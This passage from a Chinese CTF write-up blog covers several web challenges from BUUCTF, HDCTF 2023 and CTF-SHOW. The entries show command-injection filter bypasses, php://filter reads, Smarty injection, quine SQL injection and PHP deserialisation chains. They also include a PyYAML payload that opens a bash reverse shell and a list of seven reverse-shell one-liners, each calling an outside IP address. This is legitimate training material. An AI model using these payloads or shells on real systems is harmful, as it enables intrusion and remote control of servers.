进行浏览文件\n\n作用和`ls`一样\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857170069-3d416306-3483-485a-8c98-90b3fa7d5970.png)\n\n`sort`代替`cat`进行读文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857270604-b9b7b79c-de53-4bd1-a023-fcc8b44a3134.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857752295-1bffe6b1-fa37-47d1-86ec-954c63aef05f.png)\n\n注意这里抓包payload的时候要将提交方式改为post 第一次做一直都是get传参一直没做出来 之后才发现要将bp的传参方式改为post 空格用url编码方式`%20`细节很重要\n\n构造payload：`?cmd=dir%20/`\n\npost:`a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857467024-2f3e1f70-d3ea-4a45-be27-295350e349e9.png)\n\n构造payload：`?cmd=sort%20/flag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857524959-3e9deaf5-07fe-4452-bb95-4a93d916f4fd.png)\n\n第二种方式 之前说正则匹配没有过滤反斜杠\n\n反斜杠在linux命令中也是起着转义的意义 那么在字母前加`\\`就等于没加 `\\n`这种特殊情况除外\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857770921-1b917b10-6346-4376-85f9-ee34ce0e440f.png)\n\n那么就可以在命令中添加反斜杠进行绕过正则匹配\n\n构造payload:`?cmd=l\\s%20/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857842519-a139ce6f-740f-4d26-9491-5b54072c5a5c.png)\n\n再构造：`?cmd=ca\\t%20/flag`\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857890453-7b478239-0e35-4be4-849a-e51c406b7fc6.png)\n","tags":["bypass","md5强相等碰撞"],"categories":["buuctf"]},{"title":"buuctf-40-[BJDCTF2020]ZJCTF，不过如此","url":"/post/ed5a1437.html","content":"\n[BJDCTF2020]ZJCTF，不过如此\n\n<!--more-->\n\n先是一个代码审计和之前一个反序列化题目很像，就是一个伪协议的利用 \n\n构造payload：\n\n```\n?text=data:text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php\n```\n\n得到源码：\n\n```php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n```\n\n然后这里涉及到preg_replace() /e模式的漏洞 将用于替换的部分当作php代码执行 参考：https://xz.aliyun.com/t/2557\n\n这里`\\\\1` 其实就是 `\\1` 第一个 `\\ `用于转义了 那么结果就是`\\1` 在这里是反向引用 由于我这里没搞太明白 \n\n这类题直接用模板答案就行`\\S*=${命令执行}` 大佬总结的很全 \n\n思路就是调用getFlag()函数 然后cmd= 命令执行\n\n`/next.php?\\S*=${getFlag()}&cmd=system('cat /flag');` 注意是在next.php 下提交get传参\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250464663-0534828a-c656-49be-a906-3aaaf89394b0.png)\n\n这里foreach搭配`$_GET`有特殊的用法 注意这里不是`$_GET[]`\n\n本地搭了一个环境测试了一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250349098-0aa84b36-823c-4a2d-91d8-c76fcbe35c26.png)\n\n简单说就是形如a=b的形式变量名和值分成两个变量来使用 蛮神奇的\n","tags":["preg_replace() /e"],"categories":["buuctf"]},{"title":"buuctf 39-[BSidesCF 2020]Had a bad day","url":"/post/78a48903.html","content":"\n[BSidesCF 2020]Had a bad day\n\n<!--more-->\n\n打开抓包没有发现什么异常的东西，但是网站获取新页面方式有点奇怪，通过get传参取值来获取新内容，就联想到了伪协议。\n\n直接试试flag.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214256490-6f408795-207e-463c-bc26-534bf543cfd9.png)\n\n不行呢就试试index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214298541-98bada9c-dcc0-487c-ba35-bdcb23d1b86e.png)\n\n发现后台主动给我们加了.php后缀 \n\n构造payload：`?category=php://filter/read=convert.base64-encode/resource=index`\n\n获得base64码解码得出源码：\n\n```plain\n                  <?php\n    \t\t\t\t$file = $_GET['category'];\n    \n    \t\t\t\tif(isset($file))\n    \t\t\t\t{\n    \t\t\t\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n    \t\t\t\t\t\tinclude ($file . '.php');\n    \t\t\t\t\t}\n    \t\t\t\t\telse{\n    \t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n    \t\t\t\t\t}\n    \t\t\t\t}\n    \t\t\t\t?>\n```\n\n我们只能读取他规定的`woofers` `meowers` `index` 三个文件\n\n看了别人的wp 又学到了新姿势 伪协议里面还可以再嵌套一层协议 加上他给的合法文件\n\n```\n?category=php://filter/read=convert.base64-encode/index/resource=flag\n```\n\n`?category=php://filter/read=convert.base64-encode/resource=index/../flag` 两种方式都可以 学到了\n","tags":["php伪协议"],"categories":["buuctf"]},{"title":"HDCTF 2023(省内赛道)","url":"/post/dd40690e.html","content":"\nHDCTF 2023(省内赛道) 部分WP\n\n<!--more-->\n\n最终排名第七吧 web狗表示web后面几道真的很难,目前刷题还没有做到后几道题目的类型，所以后半阶段真的在坐牢，还是太菜了，努力！！！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png)\n\n# Web\n\n## Welcome To HDCTF 2023\n\n### 解一：\n\n直接送死\n\n### 解二：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png)\n\n直接输入在console中输入seeeeeeeecret就能拿到\n\n## SearchMaster\n\n这题拿了一血 开心qwq\n\n一眼丁真 php的smarty注入\n\n构造payload：\n\n```\ndata={if system('ls /')}{/if}\ndata={if system('cat /flag_13_searchmaster')}{/if}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png)\n\n# Crypto\n\n## Normal_Rsa\n\n应该是题目出问题了 打开题目flag就有\n\n# Misc\n\n## hardMisc\n\n也是拿到一个一血\n\n拖进010一把梭\n\n末尾 base64解码拿到flag\n\n\n\n# 复现：\n\n## YamiYami\n\n一道关于session伪造 yaml(一开始一直在搜yami反序列化 还在想为什么搜不到相关文章 真该死啊我)反序列化 shell反弹的题目\n\n借助这道题目好好学习一下yami漏洞和shell反弹\n\n进入题目后能看到有三个路由 `/read`是用来读文件的 `/upload`是用来上传我们的恶意代码文件的 `/pwd `字面意思就是告诉我们当前在哪个文档中\n\n当时做题的时候还以为这道题目难度应该不会很难 还以为是很基础的上传一句话木马去包含然后getshell 看了wp真的怀疑人生\n\n### 非预期\n\n先说说非预期吧 直接读取环境变量就可以了 我当时也是这么想的 但是我纯脑瘫去读linux系统用户环境信息了\n\n而且题目环境应该是在docker下\n\n一开始一直在读`/etc/profile`\n\n **/etc/profile：** 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置。  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png)\n\n根本没什么用\n\n应该读环境变量`/proc/1/environ`（详细可参考：https://blog.csdn.net/FY_2018/article/details/112986445）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png)\n\n### 预期：\n\n上传一个yami反序列化文件 然后反弹shell去打\n\n首先先去读源文件 发现做flask的题目 能get到源代码就去努力！\n\n这里用到了python3解析特性\n\n如果直接构造payload`/read?url=file:///app.py` flag字样也被正则了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png)\n\n\n\n发现是不行的 被过滤了\n\n这里用到了python3的字符解析特性通过双重url编码（全字符）去绕过\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png)\n\n拿到源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png)\n\n\n\n源码：\n\n```cmake\n#encoding:utf-8\nimport os\nimport re, random, uuid\nfrom flask import *\nfrom werkzeug.utils import *\nimport yaml\nfrom urllib.request import urlopen\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = False\nBLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"]\napp.config['UPLOAD_FOLDER']=\"/app/uploads\"\n\n@app.route('/')\ndef index():\n    session['passport'] = 'YamiYami'\n    return '''\n    Welcome to HDCTF2023 <a href=\"/read?url=https://baidu.com\">Read somethings</a>\n    <br>\n    Here is the challenge <a href=\"/upload\">Upload file</a>\n    <br>\n    Enjoy it <a href=\"/pwd\">pwd</a>\n    '''\n@app.route('/pwd')\ndef pwd():\n    return str(pwdpath)\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('app.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m:\n            return \"re.findall('app.*', url, re.IGNORECASE)\"\n        if n:\n            return \"re.findall('flag', url, re.IGNORECASE)\"\n        res = urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print(str(ex))\n    return 'no response'\n\ndef allowed_file(filename):\n   for blackstr in BLACK_LIST:\n       if blackstr in filename:\n           return False\n   return True\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            return \"Empty file\"\n        if file and allowed_file(file.filename):\n            filename = secure_filename(file.filename)\n            if not os.path.exists('./uploads/'):\n                os.makedirs('./uploads/')\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            return \"upload successfully!\"\n    return render_template(\"index.html\")\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\nif __name__=='__main__':\n    pwdpath = os.popen(\"pwd\").read()\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\n发现还有一个`/boogipop`路由\n\n```cmake\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\n```\n\n当`session=\"Welcome To HDCTF2023\"`通过get方式去读文件 也就是说还需要session伪造 \n\n伪造需要key 那么看源码是怎么生成的\n\n```cmake\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\n```\n\n在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。  \n\n`/sys/class/net/eth0/address`，这个就是网卡的位置，读取他进行伪造  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png)\n\n```cmake\nimport random\nrandom.seed(0x0242ac024ed7) #去掉：加上0x也就是十六进制\nprint(str(random.random()*233))\n```\n\n得到key为`33.893457812509084`\n\n通过脚本伪造session\n\n然后`yaml.full_load(f)`就是漏洞所在点他会将我们上传的恶意文件内容反序列化 并且代码中并没有回显的语句也暗示了这里要通过反弹shell的方式去打（这里参考这篇大佬的文章太细了 https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/）\n\n上传反序列化文件\n\n```cmake\n!!python/object/new:str\n    args: []\n    # 通过 state 触发调用\n    state: !!python/tuple\n      - \"__import__('os').system('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 <&1\\\"')\"#这里就是代码执行 通过bash直接反弹shell \n      # 下面构造 exp\n      - !!python/object/new:staticmethod\n        args: []\n        state: \n          update: !!python/name:eval\n          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功\n```\n\n至于为什么上面大佬的文章讲的很仔细 我就不献丑了 自己太菜了\n\n简单理解就是python将命令执行的代码塞入了对象中然后yaml序列化得到这个 然后再利用反序列化去命令执行 看起来比较奇怪是因为这种格式是属于yaml形式的序列化对象 所以看起来比较的陌生 还有就是这里的命令执行是用反弹shell 是因为通过看源码发现没有回显的代码 所以只能通过反弹shell去变相得到回显\n\n然后将文件命名为2.txt 这里不能用`.yaml`后缀被屏蔽了\n\n既然是txt后缀为什么代码会被执行呢\n\n这里借用大佬的理解：\n\n猜测可能是：这里full_load调用了load函数，而load函数输入的是一个steam,也就是流，二进\n制文件，所以不管是什么后缀都无关紧要了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png)\n\n上传上去\n\n然后去`/boogipop`路由下去读取，然后反弹shell\n\n这里文件路径是`uplaods/2.txt`\n\n大佬文章也提到了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png)\n\n不要在意这里为什么bp报错 nc能连通就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png)\n\n反弹shell成功\n\n再来说说反弹shell\n\n这里就说说我的理解，不会去将所有概念一字不漏的打出来，我觉得没必要，理解是最棒的，想看概念随时都可以百度，但是唯独理解是检测自己是否对于一个知识点真的理解了\n\n我们一般主动攻击去连接某个电脑，叫做正向连接，一般知道这个电脑一些信息ip之类的，知道它何时在做什么\n\n但是如果我们不知道这台电脑信息ip什么的，或者此时此刻的状态，就叫薛定谔状态吧（bushi，就没法去连接去攻击 那么应该怎么办呢？\n\n这里就用到了反弹shell 何为反弹？\n\n既然我们不知道对方的状态 但是我们知道我们的状态信息 我们可以提供我们自己的一些信息去让对方找到我们然后连接不就行了？\n\n这里可以这么形象的比喻：\n\n简单的说，就是我送了小明一份礼物，小明收到了，看见礼物里面写着xxx大街xxx户xxx号领取(木马)，小明去了敲门(打开木马，反弹shell)，我开门把他拉进来(netcat)，这样我就有了他的支配权，他的操作就被我控制了。\n\n来自一个b站网友 我觉得很形象能理解反弹shell的概念\n\n既然是对方找到我们，就需要用公网ip，我们物理机的ip都是一个局域网分配的，真实ip都掌握在运营商手里\n\n这里就需要用到vps或者在大厂买云服务即可，当然也不影响我白嫖室友的云服务器:)\n\n以上只是我浅薄的理解，可以参考这篇文章深入理解：https://xz.aliyun.com/t/9488\n\n然后我简单总结了一下一些常用的反弹shell的exp：\n\n```cmake\n1.nc\nnetcat 124.221.177.174 7777 -e /bin/bash\n2.bash\nbash -i >& /dev/tcp/124.221.177.174/7777 0>&1\n3.Telnet:\nmknod a p; telnet 124.221.177.174 7777 0<a | /bin/bash 1>a\n4.python:\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.221.177.174\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n5.php\nphp -r '$sock=fsockopen(\"124.221.177.174\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n6.perl:\nperl -e 'use Socket;$i=\"124.221.177.174\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n7.sh\nnc 124.221.177.174 7777 -e /bin/sh\n```\n\n回到题目，发现没有关于flag的文件，所以还是通过读取环境变量来读flag，结束。\n\n## LoginMaster\n\n这道题 我的评价是寄，刷题没刷到过这样的注入——quine注入，还有时间盲注也还没有开始学借助此次机会学习学习\n\n首先日常先看`/robots.txt`发现了waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png)\n\n看到waf后我就陷入了沉思，我能想到的payload所包含的几乎都河蟹了个遍，这还怎么玩，就放弃了\n\n看了wp要用时间盲注和quine组合拳去打\n\n其实看了waf 这段代码也大概能感觉到是quine注入 \n\n这里就是需要我们输入的密码与查询到的密码相等 \n\n```cmake\nif ($row['password'] === $password) {\n        die($FLAG);\n```\n\n说简单一点，quine注入就是输入与输出完全相同 自产生程序也就是说就是输入的sql语句与要输出的一致  \n\n用到replace()函数\n\n如果输入 `replace(\".\",char(46),\".\") ` \n\n则会输出 `.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png)\n\n如果输入  `replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') ` \n\n则会用第三个参数去替换第一个参数中的所有`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png)\n\n但是此时就会发现一个问题 我们输入与输出并不是完全相同的\n\n我们输入的单引号在输出语句里都是双引号\n\n因此 需要在repalce里面再嵌套一个replace来让双引号转成单引号  \n\n```\nreplace(replace(\".\",char(34),char(39)),char(46),\".\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png)\n\n用上面的式子替换所有的`.`\n\n```\nreplace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")')\n```\n\n就会发现输入与输出完全相等\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png)\n\n 回到题目 因为屏蔽了空格用`()`嵌套或者`/**/`绕过都行\n\npayload:`1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\n分析：\n\n`1'UNION(SELECT(REPLACE(A,CHAR(37),B)))`  用B替换%,%这个符号应该是任意的后续替换时变成相应的char就行\n\n`A:REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39))`  双引号换为单引号->替换%->双引号换为单引号\n\n```\nB:'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#'\n```\n\n双引号换位单引号->替换%\n\n提供三种payload吧，以后如果再遇到这样的题目也能拿来直接用\n\n1. `1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n2. `1'union/**/select/**/replace(replace('1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n3. `1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\n第一个payload与第二个payload之间的差距：为第一个与union之间有空格，第二个无，本质上两个payload无区别\n\n注意sql中为char()而不是chr() 网上payload需要转换\n\n搞定：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png)\n\n至于时间盲注这个坑，以后遇到经典题型借助题目来总结吧，这里插个眼先:)\n\n还有两道java题目就不复现了，java还是我没有解锁的领域，复现起来也很吃力，之后系统开始学java之后再来复现填坑吧。\n\n# 小尾巴\n\n这次打完省赛（校赛bushi）虽然很水，但是成功爬进了学校的实验室，也算是一段时间的努力总算有了成果吧，进了实验室才是刚刚开始，自身还是有很多不足，需要继续努力，继续奋斗，干巴得！\n","tags":["Smarty模板注入","js","Yaml反序列化","shell反弹","quine注入","python3解析特性"],"categories":["HDCTF"]},{"title":"CTF-SHOW 2023愚人杯 WEB部分WP","url":"/post/186d5605.html","content":"\nCTF-SHOW 2023愚人杯 WEB部分WP\n\n<!--more-->\n\n# Challenge_1 easy_signin\n\n这道题像是buuctf一个题目的套皮，查看源码和url，图片内容是以base64编码输出的，并且请求文件名称也是通过base64编码，直接查看index.php的内容，先编码一下index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677699456-4fddbbeb-4ad5-4059-9bd5-e8707545697e.png)\n\npayload：`?img=aW5kZXgucGhw`\n\n拿到base64加密后的内容\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677766484-107ac894-6af0-47d9-babb-dbc944ecdae2.png)\n\n再去解密一下，拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677805971-9deab45d-79af-4408-9836-64167015721e.png)\n\n# Challenge_2 被遗忘的反序列化\n\n\n\n这道题目没做出来，一开始就卡住了，他提示当前目录有个txt文件，那么就应该先去读这个文件获取相应的提示，不会啊，看了wp，发现用了php原生类读的，真的太强了\n\n然后这道题预期解真的太麻烦了，还要涉及密码偏移问题，而且还要脚本爆破，非预期真的很简单\n\n```php\n<?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this->text == \"aaaa\"){\n            echo lcfirst($this->text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -> aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key)){\n            $this->key = file_get_contents($this -> file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this->aaa;\n    }\n\n    public function __invoke(){\n        $this -> aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n```\n\n直接来看这里：\n\n```php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n```\n\n`$a = new $this->coos($this->file);` 这一行 看到这里我们是不是可以构造一个可变函数 形如：$a($b)的形式达到getshell的操作 但是这里有个new 将类实例化 也就意为着不能通过这样来构造可变函数\n\n那么这里就用到了php的原生类，具体看这篇文章：https://blog.csdn.net/cjdgg/article/details/115314651\n\n可遍历目录的原生类：\n\nDirectoryIterator 类\nFilesystemIterator 类\n\nGlobIterator 类  \n\n使用 DirectoryIterator 类\nDirectoryIterator配合glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 \n\n比如以这样的`/f*`形式模糊操作来获得flag的文件名\n\n比如我win电脑上d盘根目录下存在一个blog文件,我就可以利用原生类再配合glob协议获取到该文件的具体文件名\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680679507460-93022bf0-b786-497a-ae92-c77e7bcaad71.png)\n\n回到题目：本地构造\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法\n$w->aaa->name=\"1\";\n$w->aaa->file=\"glob:///f*\";\n$w->aaa->coos=\"DirectoryIterator\";\necho urlencode(serialize($w));\n?>\n```\n\n然后这里传参是通过请求包中AAAAAA来传参的蛮新颖的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680020351-96a2b7d8-9c2b-4bae-a866-bdb03409e953.png)\n\n然后再通过读文件原生类来读flag\n\nSplFileObject\n\n本地构造：\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法\n$w->aaa->name=\"1\";\n$w->aaa->file=\"/f1agaaa\";\n$w->aaa->coos=\"SplFileObject\";\necho serialize($w);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680133216-6324145c-b089-45c1-b238-7e7d2e81a43b.png)\n\n# Challenge_3 easy_ssti\n\n这道题还是蛮简单的 根据题目是一个模板注入的题目\n\n查看源码 下载一个压缩包\n\n```php\nfrom flask import Flask\nfrom flask import render_template_string,render_template\napp = Flask(__name__)\n\n@app.route('/hello/')\ndef hello(name=None):\n    return render_template('hello.html',name=name)\n@app.route('/hello/<name>')\ndef 